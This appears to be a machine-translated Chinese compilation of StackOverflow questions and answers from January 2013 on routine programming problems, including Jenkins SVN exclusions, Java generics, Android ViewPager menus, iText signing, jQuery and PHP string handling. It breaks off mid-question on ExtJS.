# StackOverflow 问答 14379000-14379999

# svn - 如何在 Jenkins 结帐期间排除某种类型的文件？

> ID：14379002
> 
> 赞同：4
> 
> 时间：2013-01-17T12:21:39.443
> 
> 标签：svn, jenkins

我想在 Jenkins 中使用 SVN 结帐时排除 *.zip 、*.xls 、* .pdf 、 *.doc 、 *.exe ...。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-21T16:22:15.513

如果您在服务器上安装了 SVN 1.5 或更高版本，则可以使用**[Sparse-checkouts](http://subversion.apache.org/docs/release-notes/1.5.html#sparse-checkouts)**，但这只有在您想要排除的所有文件都组织到它们自己的文件夹中时才会对您有所帮助。

实际上，SVN 不应该存储 .exe 文件（因为这些文件被认为是工件，可以从源代码构建）。也许您需要的是[`svn:ignore`](https://stackoverflow.com/questions/116074/how-to-ignore-a-directory-with-svn)财产，以避免首先签入这些文件

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:40:56.250

您是否尝试过**排除区域**？如果单击SVN 配置部分中的**高级... ，您可以找到设置。**

> 如果设置，并且 Jenkins 设置为轮询更改，Jenkins 将在确定是否需要触发构建时忽略此列表中的任何文件和/或文件夹。
> 
> 每个排除使用正则表达式模式匹配，并且必须用新行分隔。
> 
> ```
> /trunk/myapp/src/main/web/.*\.html
> /trunk/myapp/src/main/web/.*\.jpeg
> /trunk/myapp/src/main/web/.*\.gif 
> ```
> 
> 上面的示例说明，如果仅将 html/jpeg/gif 文件提交到 SCM，则不会发生构建。

# linux - opencv编译错误

> ID：14379006
> 
> 赞同：0
> 
> 时间：2013-01-17T12:21:50.590
> 
> 标签：linux, opencv, g++

我刚刚安装了 opencv 2.4.0 。在使用编译示例代码时

```
g++ -I/usr/include -L/usr/lib -lopencv_core.2.4.0 -lopencv_calib3d.2.4.0      -lopencv_imgproc.2.4.0 -lopencv_legacy.2.4.0 -lopencv_highgui.2.4.0 asd.cpp 
```

我收到以下错误

```
/usr/bin/ld: cannot find -lopencv_core.2.4.0
/usr/bin/ld: cannot find -lopencv_calib3d.2.4.0
/usr/bin/ld: cannot find -lopencv_imgproc.2.4.0
/usr/bin/ld: cannot find -lopencv_legacy.2.4.0
/usr/bin/ld: cannot find -lopencv_highgui.2.4.0
collect2: ld returned 1 exit status 
```

先感谢您。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-07-19T13:34:59.947

您使用命令行：找到 opencv_core.2.4.0 查找路径将路径添加到您的命令

# java - 在java中预定义一个泛型

> ID：14379007
> 
> 赞同：2
> 
> 时间：2013-01-17T12:21:53.260
> 
> 标签：java, generics

> **可能重复：**
> [什么时候应该封装泛型类型？](https://stackoverflow.com/questions/7241592/when-should-you-encapsulate-generic-types)

我开始在 java 中使用泛型，但在定义它们时遇到了一个大问题，因为我的代码很快变得难以阅读，例如：

```
PriorityQueue<Vertex<Integer, VertexValue, Integer, EdgeValue>> Q = new PriorityQueue<Vertex<Integer, VertexValue, Integer, EdgeValue>>(10, new AugPathPQSuperawesomeComparator()); 
```

这段代码有多个实例。

有没有办法通过使用类似的东西使它变得更小：

```
V = Vertex<Integer, VertexValue, Integer, EdgeValue>
PriorityQueue<V> Q = new PriorityQueue<V>(10, new AugPathPQSuperawesomeComparator()); 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:26:05.343

是的，您可以定义自己的类型，例如

```
class MyContainer {
  Vertex<Integer, VertexValue, Integer, EdgeValue> myComplexElt = new ...;

  // define methods for this class
  // using eclipse source->generate delegate methods
} 
```

您也可以继承类型，但这通常是一个更糟糕的主意。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:31:56.033

就像是。

```
class VPrioQueue<EV> extends PriorityQueue<Vertex<Integer, VertexValue, Integer, EV>> {
} 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:27:00.777

在不引入其他类型的情况下，一种非常快速且简单的方法可以使语句变得更小：

从 Java 1.7 开始，有菱形运算符可以让您跳过赋值中的类型语句。因此，您可以将代码重构为：

```
PriorityQueue<Vertex<Integer, VertexValue, Integer, EdgeValue>> Q = new PriorityQueue<>(10, new AugPathPQSuperawesomeComparator()); 
```

# ipad - Xcode 4.2 未检测到设备（ios6）

> ID：14379011
> 
> 赞同：2
> 
> 时间：2013-01-17T12:22:05.017
> 
> 标签：ipad, ios5, xcode4.2, device

我试图将我的设备连接`iPAD (iOS 6.0)`到`X-code(4.2 with iOS 5.0)`但设备没有被检测到..我已经进行了所有更改..设备可以在 X 代码中看到`Organizer`但不是在 X 代码中。我已经取得了临时证书和钥匙串证书都是有效的。现在在 Xcode 中`Build Identifier`我已经编辑了，甚至`Code Signing identity`对 Target 和我的应用程序进行了更改。还需要进行哪些更改。

`Base SDK`目标设备是5.0的，能不能从低配置跑到高配置。。

即使我已经尝试过与此问题相关的所有先前帖子，但对我不起作用......

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2013-01-17T12:33:12.040

*XCode 4.2*不支持*iOS6*。如果您不想更新您的*XCode*，一种将您的应用程序放入您的 iOS6 iDevice 的方法是使用*iTunes*或*iPhone 配置实用程序*

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-18T09:39:35.573

从您在评论中附加的图像中可以清楚地看出，iPad 最近已升级到 iOS 6.0.1，并且由于您的 Xcode 版本是 4.2，它仅支持版本最高为 4.2 的设备。您可以按照此处所述恢复设备版本，也可以安装支持 iOS 6.0.1 的新 Xcode 和 iOS SDK。

当 iPad OS 版本为 iOS 5.0 或更低版本时，它可能已经工作得更早了。

要使用 iTunes 添加，请选中[此](http://help.apple.com/iosdeployment-apps/mac/1.1/#app43ad7eed)选项，对于 iPhone 配置实用程序，[请选中此](http://help.apple.com/iosdeployment-apps/mac/1.1/#app43ad6ebd)选项和[此选项](http://developer.apple.com/library/ios/#featuredarticles/FA_iPhone_Configuration_Utility/Introduction/Introduction.html)

# rsync - 如何在 rsync 中转义文件名中的正斜杠？

> ID：14379014
> 
> 赞同：2
> 
> 时间：2013-01-17T12:22:14.700
> 
> 标签：rsync

我正在运行如下命令：

```
rsync -vuan "/Volumes/Working/foldername/" "/Volumes/Archive/foldername/" 
```

当文件夹名称带有“/”之类的“12/13 The Street”时，它不起作用

如何逃脱正斜杠？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-04-15T07:48:54.400

这真的很简单：unix 不允许 / 但 Mac 伪造它。GUI 使用斜线，但 unix 使用冒号：

只需打开终端并 ls 目录，它就会显示冒号而不是斜杠。经典的 mac 禁止名称中的冒号，因为那是路径分隔符；Applescript 仍然以这种方式工作，并且可能还有 Carbon API。现代 Finder 禁止用户使用 : 但它会将斜杠转换为冒号。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-18T21:13:38.393

Linux 不支持在文件名中包含 /。默认情况下，如果您需要转义我们使用的特定字符串

\Character_to_be_escaped

甚至 Windows 也不允许在文件名中使用 /。据我所知，不可能有一个名为 / 的文件或文件夹。

你可以检查我试图创建一个文件夹

```
mkdir 1/2
mkdir: cannot create directory `1/2': No such file or directory 
```

通过转义创建文件夹

```
mkdir 1\/2
mkdir: cannot create directory `1/2': No such file or directory 
```

# android - 使用 ViewPager 时，菜单和操作栏图标在滑动后响应错误的页面

> ID：14379017
> 
> 赞同：0
> 
> 时间：2013-01-17T12:22:16.603
> 
> 标签：android, eclipse, android-actionbar, android-viewpager

我是新手`Android programming`，所以请放轻松。:-)

我有一个项目列表，当用户单击一个项目时，它会将他们带到包含该项目详细信息的屏幕。用户可以左右滑动查看列表中其他项目的详细信息。
我有一些 ActionBar 图标，例如共享，增加字体大小...
等等共享而不是 item2。增加或减少字体也会发生同样的事情。如果我选择 item2，然后滑动到 item3 并增加字体大小，则 item2 的字体大小会增加而不是 item3。
我尝试了很多东西，比如使用 SimpleOnPageChangeListener 但没有用，我不知道如何正确实现它。

这是我的代码：

包含列表视图的主要活动：

```
 public class Main extends SherlockListActivity implements OnItemClickListener {

        @Override
            protected void onCreate(Bundle savedInstanceState) {
                super.onCreate(savedInstanceState);
                setContentView(R.layout.main);  

            ListView mylist = (ListView) findViewById(android.R.id.list);
            ArrayAdapter<String> adapter = new ArrayAdapter<String>(this, R.layout.simple_list_reda_1, R.id.list_content, getResources().getStringArray(R.array.items_list_array) );
            mylist.setAdapter(adapter);

            mylist.setOnItemClickListener(new OnItemClickListener() 
            {
                public void onItemClick(AdapterView<?> arg0,View arg1, int position, long arg3) 
                {
                    Intent n = null; 
                switch (position){
                    case 0: 
                        n = new Intent(getApplicationContext(), ViewPagerClass.class);
                        n.putExtra("POSITION_KEY", position);
                        break;
                    case 1: 
                        n = new Intent(getApplicationContext(), ViewPagerClass.class);
                        n.putExtra("POSITION_KEY", position);
                        break;
                    case 2: 
                        n = new Intent(getApplicationContext(), ViewPagerClass.class);
                        n.putExtra("POSITION_KEY", position);
                        break;
                    case 3: 
                        n = new Intent(getApplicationContext(), ViewPagerClass.class);
                        n.putExtra("POSITION_KEY", position);
                        break;
                    }

                    if(null!=n)
                        startActivity(n);
                }
            });     
        }
    } 
```

ViewPager 类：

```
 public class ViewPagerClass extends SherlockFragmentActivity{

        static final int NUM_ITEMS = 4;
        MyAdapter mAdapter;
        ViewPager mPager;
        @Override
        protected void onCreate(Bundle savedInstanceState) {
            super.onCreate(savedInstanceState);
            super.setContentView(R.layout.viewpager_layout);

            mAdapter = new MyAdapter(getSupportFragmentManager());
            mPager = (ViewPager) findViewById(R.id.viewpager);
            mPager.setAdapter(mAdapter);
            //mPager.setCurrentItem(2);

                final ActionBar ab = getSupportActionBar();
                ab.setDisplayHomeAsUpEnabled(true);
                ab.setDisplayUseLogoEnabled(false);
                ab.setDisplayShowHomeEnabled(false);
    }

 public boolean  onCreateOptionsMenu(Menu menu) {

        mainMenu = menu;
        subMenu1 = menu.addSubMenu(0, 1, 7, "");
        subMenu2 = menu.addSubMenu(0, 2, 6, "");
        subMenu3 = menu.addSubMenu(0, 3, 5, "");

        //some code here...

        MenuItem share = menu.findItem(R.id.menu_share);
        ShareActionProvider provider = (ShareActionProvider) share.getActionProvider();
        provider.setShareHistoryFileName(null);
        provider.setShareIntent(createShareIntent());

        getSupportMenuInflater().inflate(R.menu.textsize_subm, subMenu3);
        MenuItem subMenu3Item = subMenu3.getItem();
        subMenu3Item.setIcon(R.drawable.ic_font_size);
        subMenu3Item.setShowAsAction(MenuItem.SHOW_AS_ACTION_ALWAYS);

        return true;

    }

    private Intent createShareIntent() {

        TextView tv = (TextView) findViewById(R.id.textView1);
        Intent shareIntent = new Intent(Intent.ACTION_SEND);
        shareIntent.putExtra(Intent.EXTRA_TEXT, tv.getText());
        shareIntent.setType("text/plain");      
        return shareIntent;
    }

           @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle item selection
        switch (item.getItemId()) {
            //some code here...

            default:
                return super.onOptionsItemSelected(item);
        }
    }

    public static class MyAdapter extends FragmentPagerAdapter {
        public MyAdapter(FragmentManager fm) {
            super(fm);
        }

        @Override
        public int getCount() {
            return NUM_ITEMS;
        }

        @Override
        public Fragment getItem(int position) {

            switch(position){
            case 0: return FirstPageFragment.newInstance();

            case 1: return SecondPageFragment.newInstance();

            case 2: return ThirdPageFragment.newInstance();

            case 3: return FourthPageFragment.newInstance();

            }
            return null;
        }
    }

    public static class FirstPageFragment extends Fragment {

        public static FirstPageFragment newInstance() {
            FirstPageFragment f = new FirstPageFragment();
            return f;
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
            View V = inflater.inflate(R.layout.fragment1, container, false);
            return V;

        }
    }

    public static class SecondPageFragment extends Fragment {

        public static SecondPageFragment newInstance() {
            SecondPageFragment f = new SecondPageFragment();
            return f;
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
            View V = inflater.inflate(R.layout.fragment2, container, false);
            return V;

        }
    }

    public static class ThirdPageFragment extends Fragment {

        public static ThirdPageFragment newInstance() {
            ThirdPageFragment f = new ThirdPageFragment();
            return f;
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
            View V = inflater.inflate(R.layout.fragment3, container, false);
            return V;

        }
    }

    public static class FourthPageFragment extends Fragment {

        public static FourthPageFragment newInstance() {
            FourthPageFragment f = new FourthPageFragment();
            return f;
        }

        @Override
        public View onCreateView(LayoutInflater inflater, ViewGroup container, Bundle savedInstanceState) {
            View V = inflater.inflate(R.layout.fragment4, container, false);
            return V;

        }
    } 
```

简而言之：滑动后菜单/操作栏图标不会更新以响应当前页面。我希望我的问题很清楚。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-26T16:58:17.257

我想通了，所以我想我会在这里发帖，以防有人遇到同样的问题。解决方案实际上很简单，我不知道为什么我没有马上解决。

我使用了“setOnPageChangeListener”并将其放在“onCreate”中

这是我的代码：

```
 int pageNum;
    myPager.setOnPageChangeListener(
                    new ViewPager.SimpleOnPageChangeListener() {
                        @Override
                        public void onPageSelected(int position) {
                            //Here I put the code I want to call/update when the page changes (i.e swipe)
                                pageNum = myPager.getCurrentItem();

                            //update actionprovider & share intent after swiping
                                ShareActionProvider mShareActionProvider = (ShareActionProvider) item.getActionProvider();
                                mShareActionProvider.setShareIntent(createShareIntent());        
                            //I can also put a switch statement here, depending on which page. 
                                switch (pageNum) {
                                case 0: //..... 
```

# java - 异常处理、If 语句或 Try/Catch 块？

> ID：14379019
> 
> 赞同：-3
> 
> 时间：2013-01-17T12:22:23.033
> 
> 标签：java, exception, for-loop, try-catch

`if`在您看来，语句或`Try/Catch`块哪种方式更适合异常处理？

因为，如您所知，所有异常都可以用`if`语句处理。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:34:52.767

这取决于实际情况。我会尽力解释。

考虑这个简单的例子：

```
try {
  myVar.myFunc();
} 
catch(NullPointerException e) {
  //bla bla
} 
```

**或者**

```
if (myVar != null) 
   myVar.myFunc(); 
```

如果`myVar`可以`null`作为您的代码流的一部分，那么您可以使用`if`语句，否则您应该使用异常，因为它可能是由于您无法控制的事情引起的。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T12:30:51.483

好吧，据我了解，您对 if/else 语句的意思是，函数的返回值将是 SUCCESS 或 FAILURE，并且所有实际工作都将在函数的参数上完成。

这是一种 C 风格的编码 - 没有例外。
在java中，因为你不能通过引用（或指针）传递元素，所以这种方法是有问题的（你必须为返回一个`int`非常不优雅的方法创建一个包装器），甚至在C中——它更多的是必需品然后是优雅的东西。

示例 - C 风格的代码可以执行以下操作：

```
int calcSomething(int arg1, int arg2, int* result) { 
  //calcualtions
  if (...) return FAILURE;
  *result = ...
  return SUCCESS;
} 
```

编码环境将是：

```
if (calcSomething(...) == FAILURE) { handleError(); } 
```

注意 - 该方法在 java 中并没有完全消失，例如[`Collection#add()`](http://docs.oracle.com/javase/6/docs/api/java/util/Collection.html#add%28E%29)返回一个`boolean`指示操作是否成功的方法。它主要用于`false`值不是真正错误的操作 - 更多的是表明无事可做。

每当“错误”被阻塞时——使用异常处理错误——它们的可读性更高，代码的可维护性更好。如果它只是一个指示（对于 eaxmple - 元素已经在集合中） - 返回值中的布尔值就可以了。

# java - itext 错误“线程“主”java.lang.NullPointerException 中的异常”

> ID：14379020
> 
> 赞同：0
> 
> 时间：2013-01-17T12:22:23.640
> 
> 标签：java, itext

您好，我对 java 和使用 itext 还是很陌生。这个想法是在pdf中制作数字签名。源代码来自[这里](http://itextpdf.com/examples/iia.php?id=221)，对路径进行了一些调整..

```
package signaturefield;

public class Signaturefield {

 /** The resulting PDF */
public static String ORIGINAL = "c:/Users/example.pdf";
/** The resulting PDF */
public static String SIGNED1 = "c:/Users/signed_1.pdf";
/** The resulting PDF */
public static String SIGNED2 = "c:/Users/signed_2.pdf";

/** One of the resources. */
public static final String RESOURCE
    = "C:/Users/watermark.png";

/**
 * A properties file that is PRIVATE.
 * You should make your own properties file and adapt this line.
 */
public static String PATH = "c:/Users/key.properties";
/** Some properties used when signing. */
public static Properties properties = new Properties();
private PrivateKey pk;

/**
 * Creates a PDF document.
 * @param filename the path to the new PDF document
 * @throws DocumentException 
 * @throws IOException 
 */
public void createPdf(String filename) throws IOException, DocumentException {
    // step 1
    Document document = new Document();
    // step 2
    PdfWriter writer = PdfWriter.getInstance(document, new FileOutputStream(filename));
    // step 3
    document.open();
    // step 4
    document.add(new Paragraph("Hello World!"));
    PdfFormField field = PdfFormField.createSignature(writer);
    field.setWidget(new Rectangle(72, 732, 144, 780), PdfAnnotation.HIGHLIGHT_INVERT);
    field.setFieldName("mySig");
    field.setFlags(PdfAnnotation.FLAGS_PRINT);
    field.setPage();
    field.setMKBorderColor(BaseColor.BLACK);
    field.setMKBackgroundColor(BaseColor.WHITE);
    PdfAppearance tp = PdfAppearance.createAppearance(writer, 72, 48);
    tp.rectangle(0.5f, 0.5f, 71.5f, 47.5f);
    tp.stroke();
    field.setAppearance(PdfAnnotation.APPEARANCE_NORMAL, tp);
    writer.addAnnotation(field);
    // step 5
    document.close();
}

/**
 * Manipulates a PDF file src with the file dest as result
 * @param src the original PDF
 * @param dest the resulting PDF
 * @throws GeneralSecurityException 
 * @throws IOException 
 * @throws DocumentException 
 * @throws FileNotFoundException 
 * @throws KeyStoreException 
 * @throws Exception 
 */
public void signPdf(String src, String dest, boolean certified, boolean graphic) throws GeneralSecurityException, IOException, DocumentException {
    // private key and certificate
    String path = properties.getProperty("PRIVATE");
    String keystore_password = properties.getProperty("PASSWORD");
    String key_password = properties.getProperty("PASSWORD");
    KeyStore ks = KeyStore.getInstance("pkcs12", "BC");
    ks.load(new FileInputStream(path), keystore_password.toCharArray());
    String alias = (String)ks.aliases().nextElement();
    PrivateKey pk = (PrivateKey)ks.getKey(alias, key_password.toCharArray());
    Certificate[] chain = ks.getCertificateChain(alias);
    // reader and stamper
    PdfReader reader = new PdfReader(ORIGINAL);
    PdfStamper stamper = PdfStamper.createSignature(reader, new FileOutputStream(dest), '\0');
    // appearance
    PdfSignatureAppearance appearance = stamper.getSignatureAppearance();
    appearance.setVisibleSignature("mySig");
    appearance.setReason("It's personal.");
    appearance.setLocation("Foobar");
    if (certified) {
        appearance.setCertificationLevel(PdfSignatureAppearance.CERTIFIED_NO_CHANGES_ALLOWED);
    }
    if (graphic) {
        appearance.setSignatureGraphic(Image.getInstance(RESOURCE));
        appearance.setRenderingMode(PdfSignatureAppearance.RenderingMode.GRAPHIC);
    }
    // signature
    ExternalSignature es = new PrivateKeySignature(pk, "SHA-256", "BC");
    ExternalDigest digest = new BouncyCastleDigest();
    MakeSignature.signDetached(appearance, digest, es, chain, null,null, null, 0, CryptoStandard.CMS);
}

public static void main(String[] args)
    throws Exception {
    Security.addProvider(new BouncyCastleProvider());
    properties.load(new FileInputStream(PATH));
    Signaturefield signatures = new Signaturefield();
    signatures.createPdf(ORIGINAL);
    signatures.signPdf(ORIGINAL, SIGNED1, false, false);
    signatures.signPdf(ORIGINAL, SIGNED2, true, true);
}
} 
```

运行后我得到错误：

```
Exception in thread "main" java.lang.NullPointerException
    at java.io.FileInputStream.<init>(FileInputStream.java:134)
    at java.io.FileInputStream.<init>(FileInputStream.java:97)
    at signaturefield.Signaturefield.signPdf(Signaturefield.java:114)
    at signaturefield.Signaturefield.main(Signaturefield.java:146)
Java Result: 1 
```

有修复它的想法吗？多谢

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2013-01-17T12:26:39.520

这意味着您`path`的变量`null`在`signPdf`方法中。您正在加载的属性文件没有名为`PRIVATE`.

# google-app-engine - 有没有办法在谷歌应用引擎 blobstore 中获取密钥列表？

> ID：14379024
> 
> 赞同：2
> 
> 时间：2013-01-17T12:22:35.597
> 
> 标签：google-app-engine, blobstore

我的计划是通过随机选择其中一个键并检查数据存储中对它的引用来删除孤立的 blob（每十秒左右重复一次）。有没有办法得到那个清单？

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2015-04-01T10:15:36.587

您正在寻找的方法是 BlobInfoFactory 上的 queryBlobInfos() 方法。它将为您提供所有存储的 blob，您可以检查并删除孤儿。不知道为什么这不在 BlobstoreService 上。 [https://cloud.google.com/appengine/docs/java/javadoc/com/google/appengine/api/blobstore/BlobInfoFactory#queryBlobInfos()](https://cloud.google.com/appengine/docs/java/javadoc/com/google/appengine/api/blobstore/BlobInfoFactory#queryBlobInfos())

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T14:50:00.943

当您在数据存储中有引用时，您可以获取 file_name 并删除孤儿。

```
 blob_key = # you have stored
    blob_info = blobstore.BlobInfo.get(blob_key)
    blobs = blobstore.BlobInfo.gql("WHERE filename = '%s'" %(blob_info.filename))                            
    for blob in blobs :
        if blob.key() != blob_key :    # do not delete the referenced one 
            blob.delete() 
```

当然，您也可以使用 gql 查询所有 blob 并将其与您的参考进行比较。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2015-09-20T08:24:38.990

基于 Goose 的回答，这是我在实验后清理所有开发混乱的方式：

```
 private BlobInfoFactory blobInfoFactory = new BlobInfoFactory();

private void deleteAllBlobs() {
    Iterator<BlobInfo> blobsIterator = blobInfoFactory.queryBlobInfos();
    while (blobsIterator.hasNext()) {
        BlobInfo blobInfo = (BlobInfo) blobsIterator.next();
        LOG.info("Removing blob " + blobInfo.getFilename());
        blobstoreService.delete(blobInfo.getBlobKey());
    }
} 
```

# javascript - 如何在 jquery 中拆分带有“AND”和/或“OR”参数的查询？

> ID：14379025
> 
> 赞同：1
> 
> 时间：2013-01-17T12:22:39.117
> 
> 标签：javascript, jquery

如何在 jquery 中拆分带有“AND”和/或“OR”参数的查询？假设我有

```
A=( 1=1,FirstName='aaa' or FirstName='bbb' and FirstName='ccc' or FirstName='ddd' and FirstName='eee') 
```

现在我想用 'and' & 'or' 拆分 'A' 并得到如下结果

```
A=(FirstName='aaa' , FirstName='dddd' , FirstName='bbb' , FirstName='dddd' , FirstName='cccc') 
```

但问题是我在查询中可能有也可能没有“或”，但它仍然应该在拆分后产生带有所有值的 ao/p。请帮忙。不同类型的查询可能如下：

```
A=( 1=1,FirstName='aaa' or FirstName='bbb' and FirstName='ccc' or FirstName='eee' and FirstName='fff')  
A=( 1=1,FirstName='aaa' and FirstName='bbb' and FirstName='ccc' and FirstName='ddd' and FirstName='fff')
A=( 1=1,FirstName='aaa' or FirstName='bbb' or FirstName='ccc' or FirstName='ddd' or FirstName='fff') 
```

查询不是静态的，我只是举了一个例子，它可以是任何字符串。

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:35:55.393

一个鲜为人知的事实是，您可以将正则表达式作为分隔符传递给[String`.split()`方法](https://developer.mozilla.org/en-US/docs/JavaScript/Reference/Global_Objects/String/split)。

```
var A = "FirstName='aaa' or FirstName='bbb' and FirstName='ccc' or FirstName='ddd' and FirstName='eee'";
A.split(/and|or/g);

/* result:
["FirstName='aaa' ", " FirstName='bbb' ", " FirstName='ccc' ", " FirstName='ddd' ", " FirstName='eee'"]
*/ 
```

# javascript - 对来自两个数组的值进行分组（平均值）

> ID：14379026
> 
> 赞同：1
> 
> 时间：2013-01-17T12:22:42.550
> 
> 标签：javascript, jquery

我有 2 个包含以下数据的数组：

```
Array1 = [A, A, A, A, B, B, B, C, C, C, C, C];    
Array2 = [4, 2, 4, 6, 3, 9, 6, 5, 4, 6, 2, 8]; 
```

我想从这些值创建 2 个新数组：

```
Array3 = [A, B, C];    
Array4 = [4, 6, 5]; 
```

Array 4 中的值是 Array2 的平均值。

javascript 或 jquery 代码应该如何创建 Array3 和 Array4？

编辑：

我想对这样的值进行分组：

```
Array1      Array2
  A           2
  A           4
------------------
  B           2
  B           6
------------------
  C           3
  C           6
  C           9

     result:

Array3      Array4
  A           3          Average from 2 and 4
  B           4          Avarage from 2 and 6
  C           6          Average from 3, 6 and 9 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2013-01-17T12:58:42.523

遍历 的每个值`Array1`。这假设`Array2`具有相同的长度：

```
var Array1 = ['A', 'A', 'A', 'A', 'B', 'B', 'B', 'C', 'C', 'C', 'C', 'C'];    
var Array2 = [4, 2, 4, 6, 3, 9, 6, 5, 4, 6, 2, 8];

var helper = {};

Array1.forEach(function (elem, index) {
  if (typeof helper[elem] === 'undefined') {
    helper[elem] = {'count': 0, 'total': 0} 
  }
  helper[elem].count++;
  helper[elem].total += Array2[index];
});

var Array3 = [];
var Array4 = [];

for (item in helper) {
  if (helper.hasOwnProperty(item)) {
    Array3.push(item);

    Array4.push(parseInt(helper[item].total / helper[item].count));
  }
}
console.log(Array3, Array4); 
```

我所做的是创建一个辅助对象，将`Array1`值存储为键，将计数/总数存储为值（可以从中计算平均值）。

[http://jsfiddle.net/V38Lt/](http://jsfiddle.net/V38Lt/)

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2013-01-17T13:10:34.430

尝试

```
// Your initial Variables
Array1 = ['A', 'A', 'A', 'A', 'B', 'B', 'B', 'C', 'C', 'C', 'C', 'C'];    
Array2 = [4, 2, 4, 6, 3, 9, 6, 5, 4, 6, 2, 8];

// a temporary variable where we store our progress
var groups = {}

$.each(Array1, function(index,item){
    if (!groups[item]){
        groups[item] = {sum:0, count:0};
    }
    groups[item].sum += Array2[index]; // sum values belonging to same key 
    groups[item].count++; // increase counter of values per key
});

// create the letter only array
var Array3 = $.map(groups,function(value,key){
    return key;
});
// create the averages array
var Array4 = $.map(groups,function(value,key){
    return value.sum / value.count;
});

// show the results
console.log(Array3, Array4); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T13:19:53.200

使用下划线，你可以这样做：

```
//create array of form [['A',4],['B',3]...] etc.
var interleaved=_.zip(Array1,Array);

//create object of form {A:[4,2,4], ...}
var grouped=_.groupBy(interleaved,function(pair){return pair[0];});

var Array3 = _.keys(grouped);
var Array4 = _.map(grouped,function(v){return array_sum(v);}); 
```

`array_sum`留给读者练习。:-)

我同意另一张发帖者的观点，即找到另一种表示这些数据的方式可能会更好，这种方式更适合您想要进行的处理。

# javascript - Jquery 和克隆 html 部分？

> ID：14379030
> 
> 赞同：3
> 
> 时间：2013-01-17T12:22:50.943
> 
> 标签：javascript, jquery

我有这个模板`div`

```
<div class="divDetails">
    <div class="divRowData" style="display: none "> 
          <span class="spanColor"></span>
          <span class="spanText"></span>
    </div>
</div> 
```

它是隐藏的。

我有一个对象数组，我需要`divRowData`使用数组中的注入数据进行复制。（并使每个新部分可见）。

但似乎我的 jquery 代码有点乱，我正在寻找一种更短的方法。

目前我做：

```
 for (var i = 0; i < arrData.length; i++)
           {
               var thediv = $(".divDetails>.divRowData:first").clone().css('display','block');
               var g = thediv.find(".spanColor").css('background-color', 'color'+i);
               var g = thediv.find(".spanText").text(arrData[i].text);
               thediv.appendTo(".divDetails");

           } 
```

如何缩短此代码？

[http://jsbin.com/etudak/1/edit](http://jsbin.com/etudak/1/edit)

[我知道我可以使用模板，但那是另一回事。]

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2013-01-17T12:42:44.257

```
$.each(arrData, function(i, v){

    $(".divDetails>.divRowData:first")
     .clone()
     .show()
     .find(".spanColor").css('background-color', 'color'+i)
     .end()
     .find(".spanText").text(v.text)
     .end()
     .appendTo(".divDetails");

}); 
```

由于需要进行一些遍历，因此我无法得到比这更短的时间。但至少这是一个链接的例子；）

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2013-01-17T12:32:17.100

也许，如果您不想使用模板，那么您无法缩短代码那么多，但无论如何您都有一些可以修复的东西。

1.  您不需要将元素保存到 variable `g`，因为您不会将该变量用于任何事情。
2.  您需要修复 background-color 属性，因为`color1`它不是有效的 background-color 值。
3.  jQuery 方法可以采用第二个参数，它是要在其中搜索的上下文，因此`thediv.find(".spanColor")`可以缩短为`$(".spanColor", thediv)`，这可能不会更短，但在我看来更具可读性。
4.  您可以`.css('display','block')`用[`.show()`](http://api.jquery.com/show/)方法替换。

总而言之，可能是这样的：

```
for (var i = 0; i < arrData.length; i++)
{
    var thediv = $(".divDetails>.divRowData:first").clone().show();

    $(".spanColor", thediv).css('background-color', '#fc0');
    $(".spanText", thediv).text(arrData[i].text);

    $(".divDetails").append(thediv);
} 
```

# php - 匹配数组中的值并替换为替代

> ID：14379032
> 
> 赞同：0
> 
> 时间：2013-01-17T12:22:55.193
> 
> 标签：php, replace

如何替换字符串中与数组中的条目匹配的值相同但前面有 \ 的值？

```
$test = "Mike (D)";
$array('(',')','@','-'); 
```

由于 ( ) 在数组中 $test 应该等于`"Mike \(D\)";`

所以基本上用带有 \ 前缀的相同项目替换项目

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2013-01-17T12:25:36.743

```
addcslashes($test, "()@-"); 
```

请参阅： http: [//php.net/manual/en/function.addcslashes.php](http://php.net/manual/en/function.addcslashes.php)

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2013-01-17T12:26:03.623

```
$test      = "Mike (D)";
$find      = array('(',')','@','-');
$repalce   = array('\(','\)','\@','\-');

$newphrase = str_replace($find, $repalce, $test); 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2013-01-17T12:31:35.307

你可以尝试这样的事情：

```
foreach ($array as $needle) { 
    if(strpos($needle, $test) {
       str_replace($needle, '\\'.$needle, $test);
    }
 } 
```

或者，如果您使用替换字符串创建一个数组，只需使用：

```
$array = array('(', ')', '@',...);
$replace = array('\(', '\)', '\@',...);
str_replace($array, $replace, $test); 
```

# extjs - ExtJS TreeStore appendChild - ids 问题

> ID：14379034
> 
> 赞同：0
> 
> 时间：2013-01-17T12:23:03.700
> 
> 标签：extjs, extjs4, extjs4.1

我正在尝试使用以下代码动态添加新节点：

```
